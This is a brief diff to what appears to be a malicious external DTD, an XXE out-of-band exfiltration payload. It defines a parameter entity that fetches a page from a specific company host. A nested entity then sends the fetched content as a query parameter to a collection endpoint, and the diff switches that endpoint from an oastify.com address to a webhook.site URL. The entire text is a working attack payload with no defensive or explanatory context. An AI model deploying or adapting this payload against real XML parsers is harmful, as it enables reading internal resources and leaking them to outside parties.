@@ -1,4 +1,4 @@
 <!ENTITY % file SYSTEM "https://jira.elliemae.io/status">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://ej1u9b4qk69aq52ggzi5v09j1a71vsjh.oastify.com/exfil?xxe=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'https://webhook.site/7a5592a0-eb45-4bf3-ad04-eb0bcd547b8e/exfil?xxe=%file;'>">
 %eval;
 %exfiltrate;
